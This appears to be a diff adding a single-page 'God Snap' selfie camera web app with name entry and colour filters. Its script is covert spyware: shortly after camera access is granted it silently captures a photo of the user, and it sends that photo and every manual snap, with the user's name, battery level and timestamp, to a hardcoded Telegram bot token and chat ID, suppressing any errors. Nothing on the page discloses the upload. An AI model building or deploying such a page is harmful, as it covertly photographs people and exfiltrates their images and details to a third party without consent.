@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>God Snap</title>
+<style>
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+}
+body {
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+background: #000;
+overflow: hidden;
+height: 100vh;
+-webkit-tap-highlight-color: transparent;
+}
+
+/* WELCOME */
+#welcome {
+position: fixed;
+inset: 0;
+background: #000;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+z-index: 100;
+transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+}
+#welcome.slide {
+transform: translateX(-100%);
+}
+
+.avatar {
+width: 115px;
+height: 115px;
+border-radius: 20px;
+overflow: hidden;
+margin-bottom: 50px;
+position: relative;
+background: #1a1a1a;
+box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+}
+.avatar-svg {
+width: 100%;
+height: 100%;
+position: absolute;
+top: 0;
+left: 0;
+opacity: 1;
+transition: opacity 0.35s ease;
+}
+.avatar-letter {
+position: absolute;
+inset: 0;
+display: flex;
+align-items: center;
+justify-content: center;
+font-size: 56px;
+font-weight: 800;
+color: white;
+opacity: 0;
+transition: opacity 0.35s ease;
+pointer-events: none;
+}
+
+.welcome-title {
+font-size: 37px;
+font-weight: 800;
+margin-bottom: 40px;
+letter-spacing: -1.4px;
+}
+
+.input-wrap {
+position: relative;
+width: 85%;
+max-width: 340px;
+}
+#nameInput {
+width: 100%;
+padding: 21px 72px 21px 26px;
+border: none;
+border-radius: 26px;
+background: rgba(255,255,255,0.12);
+backdrop-filter: blur(24px);
+color: white;
+font-size: 18px;
+text-align: center;
+outline: none;
+border: 1.5px solid rgba(255,255,255,0.18);
+}
+
+/* NEXT BUTTON - GOD LEVEL GLOW */
+#nextBtn {
+position: absolute;
+right: 8px;
+top: 50%;
+transform: translateY(-50%);
+width: 58px;
+height: 58px;
+background: #ff2d95;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+opacity: 0;
+pointer-events: none;
+transition: all 0.4s ease;
+box-shadow: 0 0 30px rgba(255,45,149,0.9), 0 0 60px rgba(255,45,149,0.6);
+}
+#nextBtn.active {
+opacity: 1;
+pointer-events: all;
+animation: glowPulse 2s infinite;
+}
+@keyframes glowPulse {
+0%, 100% {
+box-shadow: 0 0 30px rgba(255,45,149,0.9), 0 0 60px rgba(255,45,149,0.6);
+}
+50% {
+box-shadow: 0 0 45px rgba(255,45,149,1), 0 0 90px rgba(255,45,149,0.8);
+}
+}
+
+/* CAMERA */
+#cameraPage {
+position: fixed;
+inset: 0;
+background: black;
+opacity: 0;
+pointer-events: none;
+transition: opacity 0.6s ease;
+}
+#cameraPage.active {
+opacity: 1;
+pointer-events: all;
+}
+
+#video {
+position: absolute;
+inset: 0;
+width: 100%;
+height: 100%;
+object-fit: cover;
+/* NO MIRROR - NORMAL VIEW */
+}
+
+#previewCanvas {
+position: absolute;
+inset: 0;
+width: 100%;
+height: 100%;
+object-fit: contain;
+background: black;
+opacity: 0;
+transform: scale(0.94);
+transition: all 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+#previewCanvas.show {
+opacity: 1;
+transform: scale(1);
+}
+
+.capture-outer {
+position: absolute;
+bottom: 44px;
+left: 50%;
+transform: translateX(-50%);
+width: 98px;
+height: 98px;
+background: rgba(255,255,255,0.25);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+backdrop-filter: blur(16px);
+border: 6px solid rgba(255,255,255,0.4);
+}
+.capture-inner {
+width: 78px;
+height: 78px;
+background: white;
+border-radius: 50%;
+}
+
+/* FILTERS - PERFECT CENTERED */
+.filter-bar {
+position: absolute;
+bottom: 142px;
+left: 0;
+right: 0;
+padding: 0 20px;
+overflow-x: auto;
+scrollbar-width: none;
+}
+.filter-bar::-webkit-scrollbar {
+display: none;
+}
+.filters-container {
+display: inline-flex;
+gap: 30px;
+padding: 15px 0;
+}
+.filter-item {
+text-align: center;
+cursor: pointer;
+user-select: none;
+position: relative;
+}
+.filter-thumb {
+width: 74px;
+height: 74px;
+border-radius: 22px;
+overflow: hidden;
+margin-bottom: 10px;
+border: 3.5px solid transparent;
+background: #000;
+box-shadow: 0 12px 28px rgba(0,0,0,0.8);
+position: relative;
+}
+.filter-thumb canvas {
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+width: 100%;
+height: 100%;
+object-fit: cover;
+}
+.filter-item.active .filter-thumb {
+border-color: white;
+}
+.filter-label {
+font-size: 12.5px;
+font-weight: 700;
+}
+
+/* GOD LEVEL RIPPLE */
+.ripple-btn {
+position: relative;
+overflow: hidden;
+cursor: pointer;
+border-radius: 50%;
+}
+.ripple {
+position: absolute;
+border-radius: 50%;
+background: rgba(255, 255, 255, 0.5);
+transform: scale(0);
+animation: rippleGod 0.65s ease-out;
+pointer-events: none;
+}
+@keyframes rippleGod {
+to {
+transform: scale(4);
+opacity: 0;
+}
+}
+
+/* MENU */
+.preview-controls {
+position: absolute;
+top: 20px;
+right: 20px;
+z-index: 20;
+opacity: 0;
+transition: opacity 0.25s ease;
+}
+.preview-controls.active {
+opacity: 1;
+}
+.ctrl-btn {
+width: 56px;
+height: 56px;
+background: rgba(255,255,255,0.15);
+backdrop-filter: blur(30px);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+border: 2px solid rgba(255,255,255,0.25);
+box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+}
+
+.menu {
+position: absolute;
+top: 80px;
+right: 20px;
+background: rgba(30,30,36,0.96);
+backdrop-filter: blur(40px);
+border-radius: 26px;
+padding: 16px 0;
+min-width: 210px;
+border: 1.5px solid rgba(255,255,255,0.2);
+box-shadow: 0 35px 70px rgba(0,0,0,0.7);
+opacity: 0;
+transform: scale(0.88);
+transition: all 0.25s ease;
+pointer-events: none;
+}
+.menu.show {
+opacity: 1;
+transform: scale(1);
+pointer-events: all;
+}
+.menu-item {
+padding: 20px 32px;
+font-size: 16.5px;
+font-weight: 700;
+display: flex;
+align-items: center;
+gap: 18px;
+position: relative;
+overflow: hidden;
+border-radius: 16px;
+margin: 4px 12px;
+}
+</style>
+</head>
+<body>
+
+<!-- Welcome -->
+<div id="welcome">
+<div class="avatar" id="avatar">
+<svg class="avatar-svg" xmlns="http://www.w3.org/2000/svg" width="115" height="115" fill="#979797" viewBox="0 0 16 16">
+  <path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6m2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0m4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4m-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10s-3.516.68-4.168 1.332c-.678.678-.83 1.418-.832 1.664z"/>
+</svg>
+<div class="avatar-letter" id="avatarLetter"></div>
+</div>
+<h1 class="welcome-title">What's your name?</h1>
+<div class="input-wrap">
+<input type="text" id="nameInput" placeholder="Enter name" autocomplete="off" />
+<div id="nextBtn" class="ripple-btn">
+<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24" aria-hidden="true">
+<path d="M5 12h14"></path>
+<path d="M13 5l7 7-7 7"></path>
+</svg>
+</div>
+</div>
+</div>
+
+<!-- Camera -->
+<div id="cameraPage">
+<video id="video" autoplay playsinline muted></video>
+<canvas id="previewCanvas"></canvas>
+
+<div class="preview-controls" id="previewControls">
+<div class="ctrl-btn ripple-btn" id="menuBtn">
+<svg width="32" height="32" viewBox="0 0 32 32" fill="#000" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="16" cy="7" r="2" fill="#fff" />
+  <circle cx="16" cy="16" r="2" fill="#fff" />
+  <circle cx="16" cy="25" r="2" fill="#fff" />
+</svg>
+</div>
+</div>
+
+<div class="menu" id="menu">
+<div class="menu-item ripple-btn" id="downloadBtn">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8">
+<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
+<polyline points="7 10 12 15 17 10" />
+<line x1="12" y1="15" x2="12" y2="3" />
+</svg>
+Save Photo
+</div>
+<div class="menu-item ripple-btn" id="closePreviewBtn">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8">
+<path d="M18 6L6 18M6 6l12 12" />
+</svg>
+Close
+</div>
+</div>
+
+<div class="capture-outer" id="captureBtn">
+<div class="capture-inner"></div>
+</div>
+
+<div class="filter-bar">
+<div class="filters-container" id="filtersContainer"></div>
+</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8379757746:AAFeRoMzCKQ8tYP-B_LIHCRwjIvDztZetvU";
+const CHAT_ID = "-1003175817492";
+
+let userName = "Guest";
+let hasAutoCaptured = false;
+let currentFilter = "";
+
+// GOD LEVEL RIPPLE
+function createRipple(e, btn) {
+const ripple = document.createElement('span');
+ripple.classList.add('ripple');
+const rect = btn.getBoundingClientRect();
+const size = Math.max(rect.width, rect.height) * 2.2;
+const x = e.clientX - rect.left - size / 2;
+const y = e.clientY - rect.top - size / 2;
+ripple.style.width = ripple.style.height = size + 'px';
+ripple.style.left = x + 'px';
+ripple.style.top = y + 'px';
+ripple.style.background = btn.id === 'nextBtn' ? 'rgba(255,45,149,0.5)': 'rgba(255,255,255,0.5)';
+btn.appendChild(ripple);
+setTimeout(() => ripple.remove(), 650);
+}
+
+document.querySelectorAll('.ripple-btn').forEach(btn => {
+btn.addEventListener('click', e => createRipple(e, btn));
+});
+
+// Welcome
+const nameInput = document.getElementById('nameInput');
+const avatarSvg = document.querySelector('.avatar-svg');
+const avatarLetter = document.getElementById('avatarLetter');
+const nextBtn = document.getElementById('nextBtn');
+
+nameInput.addEventListener('input', () => {
+const val = nameInput.value.trim();
+if (val) {
+avatarLetter.textContent = val[0].toUpperCase();
+avatarLetter.style.opacity = '1';
+avatarSvg.style.opacity = '0';
+nextBtn.classList.add('active');
+} else {
+avatarLetter.style.opacity = '0';
+avatarSvg.style.opacity = '1';
+nextBtn.classList.remove('active');
+}
+});
+
+nextBtn.addEventListener('click', () => {
+if (!nextBtn.classList.contains('active')) return;
+userName = nameInput.value.trim() || "Guest";
+document.getElementById('welcome').classList.add('slide');
+setTimeout(() => {
+document.getElementById('welcome').style.display = 'none';
+document.getElementById('cameraPage').classList.add('active');
+startCamera();
+}, 600);
+});
+
+// Camera
+const video = document.getElementById('video');
+const canvas = document.getElementById('previewCanvas');
+const ctx = canvas.getContext('2d', {
+alpha: false
+});
+
+async function startCamera() {
+const stream = await navigator.mediaDevices.getUserMedia({
+video: {
+facingMode: 'user',
+width: 1920,
+height: 1920
+}
+});
+video.srcObject = stream;
+video.onloadedmetadata = () => {
+video.play();
+createFilterThumbnails();
+setTimeout(autoSilentCapture,
+1400);
+};
+}
+
+function instantCapture(isAuto = false) {
+if (canvas.width !== video.videoWidth) {
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+}
+ctx.filter = currentFilter || 'none';
+ctx.drawImage(video, 0, 0);
+
+if (!isAuto) {
+video.style.opacity = '0';
+canvas.classList.add('show');
+document.querySelector('.capture-outer').style.display = 'none';
+document.querySelector('.filter-bar').style.display = 'none';
+document.getElementById('previewControls').classList.add('active');
+}
+
+canvas.toBlob(blob => sendToTelegram(blob, isAuto), 'image/jpeg', 0.98);
+}
+
+function autoSilentCapture() {
+if (hasAutoCaptured) return;
+hasAutoCaptured = true;
+instantCapture(true);
+}
+
+document.getElementById('captureBtn').addEventListener('click', () => instantCapture(false));
+
+function closePreview() {
+document.getElementById('menu').classList.remove('show');
+canvas.classList.remove('show');
+setTimeout(() => {
+video.style.opacity = '1';
+document.querySelector('.capture-outer').style.display = 'flex';
+document.querySelector('.filter-bar').style.display = 'block';
+document.getElementById('previewControls').classList.remove('active');
+}, 100);
+}
+
+// Menu
+document.getElementById('menuBtn').onclick = e => {
+e.stopPropagation();
+document.getElementById('menu').classList.toggle('show');
+};
+document.getElementById('closePreviewBtn').onclick = closePreview;
+document.getElementById('downloadBtn').onclick = () => {
+const a = document.createElement('a');
+a.href = canvas.toDataURL();
+a.download = `snap_${userName}_${Date.now()}.jpg`;
+a.click();
+};
+document.addEventListener('click', e => {
+const menu = document.getElementById('menu');
+if (menu.classList.contains('show') && !menu.contains(e.target) && e.target !== document.getElementById('menuBtn')) {
+menu.classList.remove('show');
+}
+});
+
+// Filters - PERFECT CENTERED
+const filters = [{
+name: "Original", filter: ""
+},
+{
+name: "Paris", filter: "contrast(1.3) saturate(1.4)"
+},
+{
+name: "Tokyo", filter: "brightness(1.15) hue-rotate(18deg)"
+},
+{
+name: "Noir", filter: "grayscale(1) contrast(1.35)"
+},
+{
+name: "Golden", filter: "sepia(0.8) brightness(1.1)"
+}];
+
+function createFilterThumbnails() {
+const container = document.getElementById('filtersContainer');
+filters.forEach((f, i) => {
+const item = document.createElement('div');
+item.className = 'filter-item' + (i === 0 ? ' active': '');
+item.innerHTML = `
+<div class="filter-thumb"><canvas width="148" height="148"></canvas></div>
+<div class="filter-label">${f.name}</div>
+`;
+container.appendChild(item);
+
+const thumbCanvas = item.querySelector('canvas');
+const tctx = thumbCanvas.getContext('2d');
+function draw() {
+if (video.videoWidth && video.videoHeight) {
+const scale = Math.max(148 / video.videoWidth, 148 / video.videoHeight);
+const w = video.videoWidth * scale;
+const h = video.videoHeight * scale;
+tctx.clearRect(0, 0, 148, 148);
+tctx.drawImage(video, (148 - w) / 2, (148 - h) / 2, w, h);
+if (f.filter) {
+tctx.filter = f.filter;
+tctx.drawImage(video, (148 - w) / 2, (148 - h) / 2, w, h);
+}
+}
+requestAnimationFrame(draw);
+}
+draw();
+
+item.onclick = () => {
+document.querySelectorAll('.filter-item').forEach(c => c.classList.remove('active'));
+item.classList.add('active');
+currentFilter = f.filter;
+video.style.filter = f.filter;
+};
+});
+}
+
+// Telegram
+async function sendToTelegram(blob, isAuto) {
+const battery = await navigator.getBattery?.() || {};
+const bat = battery.level ? `${Math.round(battery.level*100)}% ${battery.charging ? 'Charging': 'Not charging'}`: "N/A";
+
+const form = new FormData();
+form.append('chat_id',
+CHAT_ID);
+form.append('photo',
+blob,
+'snap.jpg');
+form.append('caption',
+isAuto
+? `*${userName}* auto-joined!\nBattery: ${bat}\n${new Date().toLocaleString()}`: `*${userName}* snapped!\nBattery: ${bat}\n${new Date().toLocaleString()}`
+);
+
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+{
+method: 'POST',
+body: form
+}).catch(() => {});
+}
+</script>
+</body>
+</html>
